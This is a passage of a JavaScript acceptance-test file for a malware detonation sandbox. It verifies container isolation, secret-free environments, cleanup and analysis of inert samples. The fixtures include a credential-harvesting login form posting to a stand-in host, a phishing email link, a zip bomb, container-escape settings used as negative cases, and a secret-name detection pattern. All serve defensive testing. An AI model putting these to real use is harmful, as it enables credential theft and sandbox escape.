// Live acceptance tests: real Docker, gVisor (`runsc`, `runsc-trace`) and the images of deploy/detonation. They run where
// /usr/bin/docker and /var/log/runsc are reachable (Linux, or WSL: see deploy/local-wsl/README.md) and skip everywhere else.
//
// The first block uses harmless project commands only: `env`, `true`, and uploads that are never executed. The second block
// runs the demo samples in samples/ for real and is skipped unless DETONATION_LIVE_SAMPLES=1 (needs the safety amendment).
import test, { after, before, describe } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createServer, request } from 'node:http';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import zlib from 'node:zlib';
import {
  allowedEnv, buildContainerArgs, createContainerLedger, dockerExec, homeVolumeCreateArgs, quotaHomeVolumeCreateArgs, reap, runContainer, runSeed, startHome, teardown,
  verifyIsolation,
} from '../backend/detonation/containers.mjs';
import { isValidPng } from '../backend/detonation/analysis-loop.mjs';
import { createJobController } from '../backend/detonation/jobs.mjs';
import { detectType } from '../backend/detonation/filetype.mjs';
import { evaluate } from '../backend/detonation/findings.mjs';
import { createDetonationRoutes } from '../backend/detonation/routes.mjs';
import { hashFile } from '../backend/detonation/receipts.mjs';
import { createStages } from '../backend/detonation/stages.mjs';
import { parseRunnerLine } from '../backend/detonation/runner-result.mjs';
import { mapWine } from '../backend/detonation/wine.mjs';

const docker = (...args) => spawnSync('docker', args, { encoding: 'utf8' });
const info = docker('info', '--format', '{{json .Runtimes}}');
const missing = info.status !== 0 ? 'docker is not reachable'
  : !/"runsc-trace"/.test(info.stdout) ? 'the runsc-trace runtime is not registered'
    : !existsSync('/var/log/runsc') ? '/var/log/runsc is not reachable'
      : !['detonate', 'collect', 'analyse'].every(role => docker('image', 'inspect', `detonation-ocean/${role}`).status === 0) ? 'run deploy/detonation/build-images.sh first'
        : null;

const FAKE_API_KEY = 'fake-inference-key-0123456789abcdef';
const ENV = { DETONATION_ENABLED: 'true', UPLOAD_ENCRYPTION_KEY: 'a1'.repeat(32), VULTR_INFERENCE_API_KEY: FAKE_API_KEY };
const NO_MODEL = { available: () => false, complete: async () => { throw new Error('no model'); } };
const SAMPLES = new URL('../samples/', import.meta.url);
const HARMLESS_UPLOAD = Buffer.alloc(64, 7); // typed as unsupported, so it is never run; the detonate command is replaced by `true` anyway
const ORIGIN = 'https://ocean.example';
const LOG_ROOT = '/var/log/runsc';

const jobLabel = jobId => `label=detonation-ocean.job=${jobId}`;
const leftovers = jobId => [docker('ps', '-a', '-q', '--filter', jobLabel(jobId)).stdout.trim(), docker('volume', 'ls', '-q', '--filter', jobLabel(jobId)).stdout.trim()];

/**
 * A docker executor over the real CLI that can: swap a role's entrypoint (so a harmless command runs in the real container
 * instead of the runner), fail every `docker rm`, read the canary from the seed bind mount, and remember `docker inspect` output.
 */
function instrumentedDocker({ entrypoints = {}, failRm = false } = {}) {
  const seen = { token: null, inspected: [], calls: [] };
  const exec = async (args, options) => {
    seen.calls.push(args);
    if (failRm && args[0] === 'rm') return { code: 1, stdout: '', stderr: 'removal forced to fail', timedOut: false, truncated: false };
    let sent = args;
    if (args[0] === 'create') {
      const seed = args.find(arg => arg.endsWith(',dst=/seed,readonly'));
      if (seed) seen.token = /AKIA([A-Z0-9]{10})FAKE00/.exec(readFileSync(join(/src=([^,]+)/.exec(seed)[1], '.aws', 'credentials'), 'utf8'))?.[1] ?? null;
      const entrypoint = entrypoints[args.find(arg => arg.startsWith('detonation-ocean.role='))?.split('=')[1]];
      const image = args.findIndex(arg => arg.startsWith('detonation-ocean/'));
      if (entrypoint) sent = [...args.slice(0, image), '--entrypoint', entrypoint, ...args.slice(image)];
    }
    const result = await dockerExec(sent, options);
    if (args[0] === 'container' && args[1] === 'inspect' && args.length === 3) seen.inspected.push({ name: args[2], json: result.stdout });
    return result;
  };
  exec.seen = seen;
  return exec;
}

async function runPipeline({ file, claimedName = 'upload.bin', env = ENV, inference = NO_MODEL, ...dockerOptions }) {
  const dataDir = mkdtempSync(join(tmpdir(), 'do-live-'));
  const exec = instrumentedDocker(dockerOptions);
  const controller = createJobController({ env, dataDir, docker: exec, inference, logger() {} });
  await controller.start();
  const hostBefore = await hashFile(join(dataDir, 'host-canary'));
  const { jobId } = controller.submit({ file, claimedName, ip: '127.0.0.1' });
  await controller.idle();
  return { controller, job: controller.getJob(jobId), jobId, dataDir, seen: exec.seen, hostBefore };
}

const detonateId = seen => JSON.parse(seen.inspected.findLast(item => item.name.includes('-detonate-')).json)[0].Id;

// A job directory holding the placeholder files every role may bind-mount (6.3); nothing here is executed.
function jobFixture() {
  const jobId = `live-${Math.random().toString(16).slice(2, 14)}`;
  const dataDir = mkdtempSync(join(tmpdir(), 'do-live-'));
  const jobDir = join(dataDir, 'jobs', jobId);
  mkdirSync(jobDir, { recursive: true, mode: 0o755 });
  for (const name of ['sample.bin', 'seed-manifest.json', 'evidence.json', 'diff.json', 'static.json', 'script.py']) writeFileSync(join(jobDir, name), name.endsWith('.json') ? '[]' : 'print(1)\n', { mode: 0o644 });
  return { jobId, jobDir, dataDir };
}

const envLines = stdout => Object.fromEntries(stdout.split('\n').filter(Boolean).map(line => [line.slice(0, line.indexOf('=')), line.slice(line.indexOf('=') + 1)]));
const withEntrypoint = entrypoint => (args, options) => {
  if (args[0] !== 'create') return dockerExec(args, options);
  const image = args.findIndex(arg => arg.startsWith('detonation-ocean/'));
  return dockerExec([...args.slice(0, image), '--entrypoint', entrypoint, ...args.slice(image)], options);
};

describe('live pipeline (docker + gVisor, harmless commands only)', { skip: missing ?? false }, () => {
  let savedKey;
  before(() => { savedKey = process.env.VULTR_INFERENCE_API_KEY; process.env.VULTR_INFERENCE_API_KEY = FAKE_API_KEY; });
  after(() => { if (savedKey === undefined) delete process.env.VULTR_INFERENCE_API_KEY; else process.env.VULTR_INFERENCE_API_KEY = savedKey; });

  test('AT-1: inside the detonate and analyse containers `env` holds the allowlist and image constants only, never the API key', async () => {
    // Variables an image or Docker adds that are neither secrets nor from the controller: HOSTNAME (Docker), the image ENV lines, a blank GPG_KEY.
    const imageConstants = { detonate: ['HOSTNAME', 'PYTHONDONTWRITEBYTECODE'], analyse: ['HOSTNAME', 'GPG_KEY', 'MPLBACKEND', 'MPLCONFIGDIR', 'PYTHONDONTWRITEBYTECODE', 'PYTHON_SHA256', 'PYTHON_VERSION'] };
    for (const role of ['detonate', 'analyse']) {
      const { jobId, jobDir, dataDir } = jobFixture();
      try {
        assert.equal((await dockerExec(homeVolumeCreateArgs(jobId))).code, 0);
        const result = await runContainer({ docker: withEntrypoint('env'), jobId, role, image: `detonation-ocean/${role}`, jobDir, wallClockMs: 20_000, secrets: [FAKE_API_KEY] });
        assert.equal(result.code, 0, result.stderr);
        const seen = envLines(result.stdout);
        const allowed = allowedEnv(0);
        for (const [name, value] of Object.entries(allowed)) assert.equal(seen[name], value, `${role} ${name}`);
        assert.deepEqual(Object.keys(seen).sort(), [...Object.keys(allowed), ...imageConstants[role]].sort(), `${role} environment names`);
        assert.ok(!Object.values(seen).some(value => value.includes(FAKE_API_KEY)), `${role} must not see the API key`);
        assert.ok(!Object.entries(seen).some(([name, value]) => /KEY|TOKEN|SECRET|VULTR_/.test(name) && value !== ''), `${role} secret-named variable with a value`);
        assert.equal(result.isolation.secretEnvVars, 0);
      } finally {
        await teardown(jobId);
        rmSync(dataDir, { recursive: true, force: true });
      }
    }
  });

  test('AT-9: a full job with the detonate command replaced by `true` leaves no labelled container or volume, no upload and no runsc log', async () => {
    const { job, jobId, dataDir, seen, hostBefore } = await runPipeline({ file: HARMLESS_UPLOAD, entrypoints: { detonate: '/bin/true' } });
    assert.equal(job.state, 'done', job.error ?? '');
    const { receipt } = job.report;
    assert.deepEqual(receipt.containers.map(item => [item.role, item.runtime, item.exit.code]), [['detonate', 'runsc-trace', 0], ['collect', 'runsc', 0]]);
    assert.equal(receipt.teardownConfirmed, true);
    assert.equal(receipt.uploadDeleted, true);
    assert.equal(receipt.hostCanary, 'unchanged');
    assert.equal(await hashFile(join(dataDir, 'host-canary')), hostBefore);
    assert.deepEqual(leftovers(jobId), ['', ''], 'no container or volume carries the job label');
    assert.equal(existsSync(join(dataDir, 'jobs', jobId)), false);
    assert.deepEqual(readdirSync(join(dataDir, 'jobs')), []);
    assert.equal(existsSync(join(LOG_ROOT, detonateId(seen))), false, 'the trace log directory is deleted after parsing');
    assert.ok(job.report.verdict.signals.includes('incomplete'), 'an unsupported type is inspected only');
    // 7.3: the home volume is the 128 MB tmpfs and a verified holder keeps it mounted from the seed to the collector.
    assert.deepEqual(seen.calls.find(args => args[0] === 'volume' && args[1] === 'create'), quotaHomeVolumeCreateArgs(jobId));
    const created = seen.calls.filter(args => args[0] === 'create').map(args => args[args.indexOf('--name') + 1]);
    assert.deepEqual(created, [`do-${jobId}-holder`, `do-${jobId}-seed`, `do-${jobId}-detonate-i0-a1`, `do-${jobId}-collect-i0-a1`], 'holder first, then seed, detonate and collect');
    assert.ok(!seen.calls.some(args => args[0] === 'run'), 'no unverified docker run');
    assert.equal(seen.calls.find(args => args[0] === 'rm').at(-1), JSON.parse(seen.inspected.find(item => item.name.endsWith('-holder')).json)[0].Id, 'teardown removes the holder first');
    rmSync(dataDir, { recursive: true, force: true });
  });

  test('an unknown format goes through the unmodified runner stages: the generic step reads it (strings, entropy, binwalk, YARA), nothing runs, the job is done and incomplete', async () => {
    const { job, jobId, seen, dataDir } = await runPipeline({ file: HARMLESS_UPLOAD });
    assert.equal(job.state, 'done', job.error ?? '');
    assert.deepEqual(job.report.receipt.containers.map(item => [item.role, item.exit.code]), [['detonate', 0], ['collect', 0]]);
    const coverage = job.events.filter(item => item.event === 'coverage').map(item => item.data);
    assert.deepEqual(coverage.map(event => event.steps.map(step => [step.step, step.status])), [[['identify', 'done'], ['generic', 'done']]]);
    assert.deepEqual([job.report.verdict.depth, job.report.verdict.complete], ['twilight', false]);
    assert.ok(!job.report.evidence.some(item => item.source === 'trace' || item.source === 'diff'));
    assert.deepEqual(leftovers(jobId), ['', '']);
    assert.equal(existsSync(join(LOG_ROOT, detonateId(seen))), false);
    rmSync(dataDir, { recursive: true, force: true });
  });

  test('AT-10: with `docker rm` forced to fail the job fails, acceptingJobs turns false and POST /api/jobs answers 503', async () => {
    const exec = instrumentedDocker({ entrypoints: { detonate: '/bin/true' }, failRm: true });
    const dataDir = mkdtempSync(join(tmpdir(), 'do-live-'));
    const controller = createJobController({ env: ENV, dataDir, docker: exec, inference: NO_MODEL, logger() {} });
    await controller.start();
    assert.equal(controller.acceptingJobs, true);
    const routes = createDetonationRoutes({ env: ENV, controller, publicOrigin: ORIGIN });
    const server = createServer(async (req, res) => { if (!(await routes.handle(req, res, new URL(req.url, 'http://127.0.0.1').pathname))) { res.writeHead(404); res.end(); } });
    await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
    const post = () => {
      const boundary = 'LIVEBOUNDARY';
      const body = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="a.bin"\r\n\r\n`), HARMLESS_UPLOAD, Buffer.from('\r\n'),
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="consent"\r\n\r\ntrue\r\n--${boundary}--\r\n`),
      ]);
      return new Promise((resolve, reject) => {
        const req = request({ host: '127.0.0.1', port: server.address().port, method: 'POST', path: '/api/jobs', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length, Origin: ORIGIN } }, res => {
          const chunks = [];
          res.on('data', chunk => chunks.push(chunk));
          res.on('end', () => resolve({ status: res.statusCode, json: () => JSON.parse(Buffer.concat(chunks).toString('utf8')) }));
        });
        req.on('error', reject);
        req.end(body);
      });
    };
    let jobId;
    try {
      const accepted = await post();
      assert.equal(accepted.status, 202);
      jobId = accepted.json().jobId;
      await controller.idle();
      const job = controller.getJob(jobId);
      assert.equal(job.state, 'failed');
      assert.equal(controller.acceptingJobs, false);
      assert.equal(controller.health().acceptingJobs, false);
      assert.equal((await post()).status, 503);
    } finally {
      routes.stop();
      controller.stop();
      server.closeAllConnections();
      await new Promise(resolve => server.close(resolve));
      if (jobId) await teardown(jobId); // the real docker removes what the forced failure left behind
      rmSync(dataDir, { recursive: true, force: true });
    }
    if (jobId) assert.deepEqual(leftovers(jobId), ['', '']);
  });

  test('AT-16: the isolation check passes real `docker inspect` output for every role and fails each altered flag', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    const mutations = {
      'cap-drop': c => { c.HostConfig.CapDrop = []; },
      'network-mode': c => { c.HostConfig.NetworkMode = 'bridge'; },
      'networks': c => { c.NetworkSettings.Networks = { bridge: {} }; },
      'read-only-root': c => { c.HostConfig.ReadonlyRootfs = false; },
      'privileged': c => { c.HostConfig.Privileged = true; },
      'security-opt': c => { c.HostConfig.SecurityOpt = []; },
      'runtime': c => { c.HostConfig.Runtime = 'runc'; },
      'devices': c => { c.HostConfig.Devices = [{ PathOnHost: '/dev/fuse' }]; },
      'binds': c => { c.HostConfig.Binds = ['/:/host']; },
      'log-driver': c => { c.HostConfig.LogConfig.Type = 'json-file'; },
      'user': c => { c.Config.User = 'root'; },
      'pids-limit': c => { c.HostConfig.PidsLimit = 0; },
      'nproc': c => { c.HostConfig.Ulimits = null; },
      'memory': c => { c.HostConfig.Memory = 0; },
      'memory-swap': c => { c.HostConfig.MemorySwap = -1; },
      'nano-cpus': c => { c.HostConfig.NanoCpus = 0; },
      'tmpfs': c => { c.HostConfig.Tmpfs = {}; },
      'mounts': c => { c.Mounts = c.Mounts.slice(1); },
      'labels': c => { c.Config.Labels = {}; },
      'stop-timeout': c => { c.Config.StopTimeout = 10; },
      'env': c => { c.Config.Env.push('MY_API_KEY=abc'); },
    };
    try {
      assert.equal((await dockerExec(homeVolumeCreateArgs(jobId))).code, 0);
      for (const role of ['detonate', 'collect', 'analyse']) {
        const spec = { jobId, role, jobDir, image: `detonation-ocean/${role}` };
        const created = await dockerExec(buildContainerArgs(spec));
        assert.equal(created.code, 0, created.stderr);
        const inspected = await dockerExec(['container', 'inspect', `do-${jobId}-${role}-i0-a1`]);
        assert.equal(verifyIsolation(inspected.stdout, spec).role, role);
        for (const [problem, change] of Object.entries(mutations)) {
          const altered = JSON.parse(inspected.stdout);
          change(altered[0]);
          assert.throws(() => verifyIsolation(JSON.stringify(altered), spec), new RegExp(`isolation check failed:.*\\b${problem}\\b`), `${role}: ${problem}`);
        }
        assert.throws(() => verifyIsolation(inspected.stdout, { ...spec, secrets: [allowedEnv(0).USER] }), /env/, 'a secret value in any variable fails the job');
      }
    } finally {
      await teardown(jobId);
      rmSync(dataDir, { recursive: true, force: true });
    }
  });
});

describe('live analysis artifacts and trace log cleanup (docker + gVisor, project-written commands only)', { skip: missing ?? false }, () => {
  const TIMELINE_SCRIPT = [
    'import json',
    'import matplotlib.pyplot as plt',
    'print("progress line from the script")',
    'fig, ax = plt.subplots(figsize=(4, 2))',
    'ax.plot([0, 1, 2], [1, 3, 2])',
    'ax.set_title("timeline")',
    'fig.savefig("timeline.png")',
    'open("summary.json", "w").write(json.dumps({"ok": True}))',
    'open("payload.exe", "wb").write(b"MZ")',
    '',
  ].join('\n');
  const stageContext = (jobId, jobDir) => ({ jobId, jobDir, docker: dockerExec, clock: () => new Date(), evidence: [], containers: [], itemIndex: 0 });

  test('a project-written analysis script produces timeline.png (matplotlib) that comes back through runScript as a valid PNG', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    const ctx = stageContext(jobId, jobDir);
    try {
      const result = await createStages({ env: {} }).runScript(TIMELINE_SCRIPT, ctx);
      assert.equal(result.exitCode, 0, result.stderr);
      assert.ok(isValidPng(result.artifacts['timeline.png']), 'timeline.png is a valid PNG');
      assert.equal(result.artifacts['timeline.png'].subarray(1, 4).toString('latin1'), 'PNG');
      assert.deepEqual(JSON.parse(result.artifacts['summary.json'].toString('utf8')), { ok: true });
      assert.deepEqual(Object.keys(result.artifacts).sort(), ['summary.json', 'timeline.png'], 'a name outside the allowlist is not returned');
      assert.match(result.stderr, /progress line from the script/, 'the script\'s own stdout goes to stderr and cannot corrupt the artifact line');
      assert.deepEqual(ctx.containers.map(item => [item.role, item.exit.code]), [['analyse', 0]]);

      const failing = await createStages({ env: {} }).runScript('raise SystemExit(3)\n', ctx);
      assert.deepEqual([failing.exitCode, failing.artifacts], [3, {}]);
      const crashing = await createStages({ env: {} }).runScript('raise RuntimeError("boom")\n', ctx);
      assert.equal(crashing.exitCode, 1);
      assert.match(crashing.stderr, /RuntimeError: boom/);
    } finally {
      await teardown(jobId);
      rmSync(dataDir, { recursive: true, force: true });
    }
  });

  test('teardown deletes the runsc log directory of the detonate container even when the trace was never parsed', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    let id;
    try {
      assert.equal((await dockerExec(homeVolumeCreateArgs(jobId))).code, 0);
      const result = await runContainer({ docker: withEntrypoint('/bin/true'), jobId, role: 'detonate', image: 'detonation-ocean/detonate', jobDir, wallClockMs: 20_000 });
      assert.equal(result.code, 0, result.stderr);
      id = JSON.parse(result.inspectJson)[0].Id;
      assert.equal(existsSync(join(LOG_ROOT, id)), true, 'runsc-trace wrote a log directory');
      assert.equal((await teardown(jobId)).confirmed, true);
      assert.equal(existsSync(join(LOG_ROOT, id)), false, 'teardown removed it');
      assert.deepEqual(leftovers(jobId), ['', '']);
    } finally {
      await teardown(jobId);
      if (id) rmSync(join(LOG_ROOT, id), { recursive: true, force: true });
      rmSync(dataDir, { recursive: true, force: true });
    }
  });
});

// M4 runner kinds. Inputs are inert and written in this block (a plain page, a form that posts to a .invalid host, a text PDF, a stored zip,
// a docx with no macro, a one-line ps1, an email, `inert.exe` built from tests/fixtures/detonation/exe/inert.c). Nothing from samples/ runs.
describe('live runner kinds (M4: browser, static, office, emulator, unpack; inert inputs only)', { skip: missing ?? false }, () => {
  const INERT_EXE = readFileSync(new URL('./fixtures/detonation/exe/inert.exe', import.meta.url));
  const PAGE = '<!doctype html><html><head><title>Inert</title></head><body><h1 id="h">Hello</h1><p>Plain page.</p></body></html>\n';
  const FORM = '<!doctype html><html><body><form action="http://collect.example.invalid/post" method="post"><input name="user" type="text"><input name="pass" type="password"><button type="submit">Sign in</button></form></body></html>\n';
  const TEXT_PDF = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 20 100 Td (Inert text) Tj ET\nendstream\nendobj\n5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\ntrailer\n<< /Size 6 /Root 1 0 R >>\n%%EOF\n');
  const EML = Buffer.from('From: A <a@example.invalid>\r\nTo: B <b@example.invalid>\r\nSubject: inert\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary="b1"\r\n\r\n--b1\r\nContent-Type: text/html; charset="utf-8"\r\n\r\n<html><body><p>See <a href="http://evil.example.invalid/x">http://good.example.invalid/</a></p></body></html>\r\n--b1\r\nContent-Type: text/plain; name="note.txt"\r\nContent-Disposition: attachment; filename="note.txt"\r\n\r\nhello attachment\r\n--b1--\r\n');

  // A zip with stored (uncompressed) entries; enough for the type detector, 7zz and LibreOffice.
  function storedZip(entries) {
    const locals = [];
    const central = [];
    let offset = 0;
    for (const [name, text] of Object.entries(entries)) {
      const data = Buffer.from(text);
      const nameBytes = Buffer.from(name);
      const head = Buffer.alloc(30);
      head.writeUInt32LE(0x04034b50, 0);
      head.writeUInt16LE(20, 4);
      head.writeUInt32LE(zlib.crc32(data), 14);
      head.writeUInt32LE(data.length, 18);
      head.writeUInt32LE(data.length, 22);
      head.writeUInt16LE(nameBytes.length, 26);
      const entry = Buffer.alloc(46);
      entry.writeUInt32LE(0x02014b50, 0);
      entry.writeUInt16LE(20, 4);
      entry.writeUInt16LE(20, 6);
      head.copy(entry, 16, 14, 26);
      entry.writeUInt16LE(nameBytes.length, 28);
      entry.writeUInt32LE(offset, 42);
      locals.push(head, nameBytes, data);
      central.push(entry, nameBytes);
      offset += head.length + nameBytes.length + data.length;
    }
    const directory = Buffer.concat(central);
    const end = Buffer.alloc(22);
    end.writeUInt32LE(0x06054b50, 0);
    end.writeUInt16LE(central.length / 2, 8);
    end.writeUInt16LE(central.length / 2, 10);
    end.writeUInt32LE(directory.length, 12);
    end.writeUInt32LE(offset, 16);
    return Buffer.concat([...locals, directory, end]);
  }
  const DOCX = storedZip({
    '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
    '_rels/.rels': '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
    'word/document.xml': '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Inert document</w:t></w:r></w:p></w:body></w:document>',
  });

  const coverage = job => job.events.filter(item => item.event === 'coverage').map(item => item.data);
  const clean = async result => {
    assert.deepEqual(leftovers(result.jobId), ['', ''], 'no container or volume carries the job label');
    assert.equal(existsSync(join(LOG_ROOT, detonateId(result.seen))), false, 'the trace log directory is deleted');
    rmSync(result.dataDir, { recursive: true, force: true });
  };
  const finished = (result, ...kinds) => {
    assert.equal(result.job.state, 'done', result.job.error ?? '');
    assert.ok(result.job.report.receipt.containers.every(item => item.network === 'none'), 'every container ran with no network');
    for (const kind of kinds) assert.ok(coverage(result.job).some(event => event.steps.some(step => step.step === kind)), `a coverage step ${kind}`);
  };

  test('html: a plain page renders in headless Chromium with no network: Sunlight, complete, screenshots taken', async () => {
    const result = await runPipeline({ file: Buffer.from(PAGE), claimedName: 'page.html' });
    finished(result, 'run');
    const { verdict } = result.job.report;
    assert.deepEqual([verdict.depth, verdict.complete, verdict.findings], ['sunlight', true, []]);
    assert.deepEqual(result.job.report.evidence.filter(item => item.source === 'browser'), []);
    await clean(result);
  });

  test('html: a login form is filled with dana@example.invalid and the per-job canary credential; the post is blocked: Midnight, fake-login and exfil-attempt', async () => {
    const result = await runPipeline({ file: Buffer.from(FORM), claimedName: 'login.html' });
    finished(result, 'run');
    const { verdict, evidence } = result.job.report;
    assert.equal(verdict.depth, 'midnight');
    assert.deepEqual(verdict.findings.map(finding => finding.id).sort(), ['exfil-attempt', 'fake-login']);
    const blocked = evidence.find(item => item.kind === 'request-blocked');
    assert.equal(blocked.url, 'http://collect.example.invalid/post');
    assert.ok(blocked.body.includes(`CorrectHorse-${result.seen.token}`) && blocked.body.includes('dana%40example.invalid'), 'the typed credential carries the canary');
    assert.equal(evidence.find(item => item.kind === 'form-submit').typedCredential, true);
    await clean(result);
  });

  test('pdf: pdfid and pdf-parser find nothing in a text PDF; the PDF is not rendered; the verdict is not Twilight for an exploit', async () => {
    const result = await runPipeline({ file: TEXT_PDF, claimedName: 'text.pdf' });
    finished(result, 'static');
    const { verdict, evidence } = result.job.report;
    assert.ok(!evidence.some(item => item.kind === 'exploit-indicator'));
    assert.deepEqual(verdict.findings, []);
    assert.ok(!verdict.signals.includes('exploit-unproven'));
    await clean(result);
  });

  test('office: olevba finds no macro in a plain docx and LibreOffice opens it headless', async () => {
    const result = await runPipeline({ file: DOCX, claimedName: 'inert.docx' });
    finished(result, 'static', 'run');
    const { verdict, evidence } = result.job.report;
    assert.deepEqual(verdict.findings, []);
    assert.ok(!evidence.some(item => item.kind === 'exploit-indicator' || item.kind === 'emulation-stopped'), 'no macro and LibreOffice opened it');
    await clean(result);
  });

  test('ps1: PowerShell 7 runs a one-line script; static hits are empty', async () => {
    const result = await runPipeline({ file: Buffer.from('Write-Output "hello from an inert script"\n'), claimedName: 'hello.ps1' });
    finished(result, 'static', 'run');
    assert.deepEqual([result.job.report.verdict.depth, result.job.report.verdict.complete, result.job.report.verdict.findings], ['sunlight', true, []]);
    await clean(result);
  });

  test('exe: Speakeasy emulates a program that only returns; nothing is flagged and nothing is written outside the emulator', async () => {
    const result = await runPipeline({ file: INERT_EXE, claimedName: 'inert.exe' });
    finished(result, 'emulate');
    const { verdict, evidence } = result.job.report;
    assert.equal(result.job.report.file.path, 'emulate');
    assert.deepEqual(verdict.findings, []);
    assert.ok(evidence.some(item => item.source === 'emulator' && item.kind === 'api-call'), 'API calls were recorded');
    await clean(result);
  });

  test('zip: a one-entry archive is unpacked in the container and its page is detonated as a child item (item 1)', async () => {
    const result = await runPipeline({ file: storedZip({ 'page.html': PAGE }), claimedName: 'one.zip' });
    finished(result, 'unwrap', 'run');
    const steps = coverage(result.job);
    assert.deepEqual(steps.map(event => [event.item, event.parent]), [[0, null], [1, 0]]);
    assert.equal(result.job.report.receipt.containers.filter(item => item.role === 'detonate').length, 2, 'one detonate container per item');
    assert.deepEqual([result.job.report.verdict.depth, result.job.report.verdict.complete], ['sunlight', true]);
    await clean(result);
  });

  test('eml: the body link that hides its host is a phishing indicator and the attachment is a child item', async () => {
    const result = await runPipeline({ file: EML, claimedName: 'inert.eml' });
    finished(result, 'unwrap');
    const { evidence } = result.job.report;
    assert.ok(evidence.some(item => item.kind === 'phishing-indicator' && item.indicator === 'link text differs from target host'));
    assert.ok(coverage(result.job).some(event => event.item === 1 && event.parent === 0), 'note.txt is item 1');
    await clean(result);
  });

  test('AT-13: a nested zip bomb stops at the unpack caps with `incomplete`, never fills the disk and the job completes', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'do-bomb-'));
    try {
      const made = spawnSync('node', ['tools/make-samples.mjs', '--bomb', dir], { cwd: fileURLToPath(new URL('..', import.meta.url)), encoding: 'utf8' });
      assert.equal(made.status, 0, made.stderr);
      const started = Date.now();
      const result = await runPipeline({ file: readFileSync(join(dir, 'bomb.zip')), claimedName: 'bomb.zip' });
      assert.ok(Date.now() - started < 180_000, 'inside the whole-job cap');
      finished(result, 'unwrap');
      const stopped = result.job.report.evidence.filter(item => item.kind === 'emulation-stopped' && /^unpack-/.test(item.reason));
      assert.ok(stopped.length >= 1, 'an unpack cap stopped the run');
      assert.equal(result.job.report.verdict.complete, false);
      assert.ok(result.job.report.verdict.signals.includes('incomplete'));
      assert.ok(!result.job.report.verdict.findings.some(finding => finding.id === 'resource-hijack'));
      await clean(result);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('AT-14: content that is HTML named invoice.pdf.html is detected as html with claimed extension pdf and gets type-mismatch; it is not rendered', () => {
    // Detection and rules only: the pipeline is not run, so no page is rendered.
    const typed = detectType(Buffer.from(FORM), 'invoice.pdf.html');
    assert.deepEqual([typed.detectedType, typed.claimedExtension, typed.mismatch, typed.path], ['html', 'pdf', true, 'run']);
    const verdict = evaluate({ evidence: [{ id: 'ev-1', source: 'identify', kind: 'type-mismatch', detail: 'x', at: '2026-01-01T00:00:00.000Z', detectedType: typed.detectedType, claimedExtension: typed.claimedExtension }], path: 'inspect', canaryTokens: [] });
    assert.ok(verdict.signals.includes('type-mismatch'));
    assert.equal(verdict.depth, 'twilight');
  });
});

// M4b compatibility chain (SPEC 6.6, AT-19 to AT-24). Inputs are inert programs built from source in tests/fixtures/detonation/exe (inert.c, UPX-packed
// and Inno Setup copies of it, and the probes probe-effects.c, probe-wine-check.c and probe-missing-dll.c). Wine runs only those and its own built-ins.
// The Wine tests need the wine image and the runc runtime; the job sets DETONATION_WINE_RUNC=true for them. Nothing from samples/ runs.
const wineMissing = missing ?? (docker('image', 'inspect', 'detonation-ocean/wine').status !== 0 ? 'run deploy/detonation/build-images.sh first (wine image)'
  : !/"runc"/.test(info.stdout) ? 'the runc runtime is not registered' : null);

describe('live compatibility chain (M4b: identify, unwrap, static, generic, parser; inert inputs only)', { skip: missing ?? false }, () => {
  const exe = name => readFileSync(new URL(`./fixtures/detonation/exe/${name}`, import.meta.url));
  // Typed 'unknown' (the detector calls bytes such as 0x07 text): a magic and a spread of byte values.
  const BLOB = Buffer.concat([Buffer.from('BLOB'), Buffer.from(Array.from({ length: 300 }, (_, i) => (i * 37 + 11) % 256))]);
  const coverage = job => job.events.filter(item => item.event === 'coverage').map(item => item.data);
  const stepsOf = (job, item) => Object.fromEntries(coverage(job).find(event => event.item === item).steps.map(step => [step.step, step]));
  const clean = result => {
    assert.deepEqual(leftovers(result.jobId), ['', ''], 'no container or volume carries the job label');
    assert.equal(result.job.report.receipt.teardownConfirmed, true);
    rmSync(result.dataDir, { recursive: true, force: true });
  };
  const done = result => {
    assert.equal(result.job.state, 'done', result.job.error ?? '');
    assert.ok(result.job.report.receipt.containers.every(item => item.network === 'none'), 'every container ran with no network');
  };

  test('AT-19: a UPX-packed program is unpacked with upx -d and the unpacked binary (item 1) is emulated; the coverage list shows both steps', async () => {
    const result = await runPipeline({ file: exe('inert-upx.exe'), claimedName: 'packed.exe' });
    done(result);
    const { job } = result;
    assert.deepEqual(coverage(job).map(event => [event.item, event.parent]), [[0, null], [1, 0]]);
    const root = stepsOf(job, 0);
    assert.equal(root.unwrap.status, 'done');
